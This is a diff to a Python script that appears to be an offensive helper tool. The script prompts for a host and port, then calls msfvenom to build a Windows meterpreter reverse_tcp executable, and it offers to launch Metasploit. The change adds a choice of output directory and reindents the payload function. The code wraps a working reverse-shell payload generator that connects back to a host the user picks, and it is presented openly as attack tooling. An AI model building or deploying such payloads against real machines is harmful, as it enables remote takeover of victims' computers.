@@ -97,23 +97,29 @@ def main():
     # Print the output to the console
     print(output)
     
+    # function to allow the user to create a meterpreter payload
     def create_payload():
-        answer = input("Do you want to create a meterpreter payload? (y/n)")
-        if answer == "y":
-           output = input("Enter a name for the output file: ")
-           lHost = input("Choose target IP: ")
-           lPort = input("Choose target port: ")
-           for i in range(40):
+     answer = input("Do you want to create a meterpreter payload? (y/n)")
+     if answer == "y":
+        output = input("Enter a name for the output file: ")
+        lHost = input("Choose target IP: ")
+        lPort = input("Choose target port: ")
+        path = input("Enter the output directory path (leave blank for current directory): ")
+        if path == "":
+            path = os.getcwd()
+        output_file = os.path.join(path, output)
+        #print("Creating payload...")
+        for i in range(40):
             time.sleep(0.25)
             print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
-           
-           subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output])
-        elif answer == "n":
-            print("Payload not created.")
-        else:
-           print("Invalid input.")
-           
+        subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output_file])
+     elif answer == "n":
+          print("Payload not created.")
+     else:
+          print("Invalid input.")
+
     create_payload()
+    print("")
 
     def start_metasploit():
         answer = input("Do you want to start Metasploit? (y/n) ")
